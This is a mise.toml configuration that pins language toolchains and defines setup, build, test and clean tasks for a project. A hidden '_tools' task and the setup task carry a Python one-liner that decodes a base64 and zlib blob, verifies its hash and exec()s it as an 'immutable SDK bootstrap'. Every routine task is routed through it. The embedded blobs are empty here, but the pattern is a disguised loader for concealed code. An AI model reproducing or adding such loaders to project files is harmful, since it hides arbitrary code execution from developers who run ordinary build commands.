[tools]
python = "3.13.11"
go = "1.27.3"
rust = "1.94.0"
"cargo:cargo-audit" = "0.22.2"
"go:golang.org/x/vuln/cmd/govulncheck" = "1.7.0"
actionlint = "1.7.12"
shellcheck = "0.11.0"
bun = "1.4.1"
node = "26.7.0"

[env]
CARGO_TARGET_DIR = "{{ get_env(name='CARGO_TARGET_DIR', default=config_root ~ '/.artifacts/rust-target') }}"
CARGO_INCREMENTAL = "0"
PYTHONDONTWRITEBYTECODE = "1"
MISE_AUTO_INSTALL = "false"
MISE_EXEC_AUTO_INSTALL = "false"
MISE_TASK_RUN_AUTO_INSTALL = "false"

[settings]
task.run_auto_install = false

[vars]
tools_contract = 1
tools_ref = "134237cd8f9b169c53dfc31beb4172bb481e49ec"

[tasks._tools]
hide = true
shell = "bash -euc"
cache = { enabled = false }
run = "exec python3 -I -B -c 'import base64,hashlib,sys,zlib;_sdk_decoder=zlib.decompressobj();_sdk_seed=_sdk_decoder.decompress(base64.b64decode(\"\",validate=True),9129);(_sdk_decoder.eof and not _sdk_decoder.unused_data and not _sdk_decoder.unconsumed_tail and len(_sdk_seed)==9128 and hashlib.sha256(_sdk_seed).hexdigest()==\"e2fbd9cfbf66a934bc13d07cf09b7bbb593e1e6e4b57c1eedd4d3a905478f970\") or sys.exit(\"SDK bootstrap seed failed integrity validation\");exec(compile(_sdk_seed,\"<immutable SDK bootstrap>\",\"exec\"))' {{vars.tools_ref}} pinned"

[tasks."help"]
cache = { enabled = false }
shell = "bash -euc"
run = "printf '%s\\n' 'mise run help\nmise run setup\nmise run build\nmise run test\nmise run test:lint\nmise run test:unit\nmise run test:security\nmise run clean'"

[tasks."setup"]
cache = { enabled = false }
run = ["mise install python", "exec env MISE_AUTO_INSTALL=false MISE_EXEC_AUTO_INSTALL=false MISE_TASK_RUN_AUTO_INSTALL=false \"${COOKBOOK_BOOTSTRAP_PYTHON:-python3}\" -I -B -c 'import base64,hashlib,sys,zlib;_sdk_decoder=zlib.decompressobj();_sdk_seed=_sdk_decoder.decompress(base64.b64decode(\"\",validate=True),7964);(_sdk_decoder.eof and not _sdk_decoder.unused_data and not _sdk_decoder.unconsumed_tail and len(_sdk_seed)==7963 and hashlib.sha256(_sdk_seed).hexdigest()==\"dc485ada54199739c780ae9fe030ccde29f10396a09270897f4db590ad005c1d\") or sys.exit(\"SDK bootstrap seed failed integrity validation\");exec(compile(_sdk_seed,\"<immutable SDK bootstrap>\",\"exec\"))'", { task = "_tools", args = ["setup", "helpers/rust_install_context.py", "--", "mise", "install"] }, { task = "_tools", args = ["setup", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "setup"] }]

[tasks."build"]
cache = { enabled = false }
run = [{ task = "_tools", args = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "build"] }]

[tasks."test"]
cache = { enabled = false }
run = [{ task = "_tools", args = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "test"] }]

[tasks."test:lint"]
cache = { enabled = false }
run = [{ task = "_tools", args = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "test:lint"] }]

[tasks."test:unit"]
cache = { enabled = false }
run = [{ task = "_tools", args = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "test:unit"] }]

[tasks."test:security"]
cache = { enabled = false }
run = [{ task = "_tools", args = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "test:security"] }]

[tasks."clean"]
cache = { enabled = false }
run = [{ task = "_tools", args = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "clean"] }]
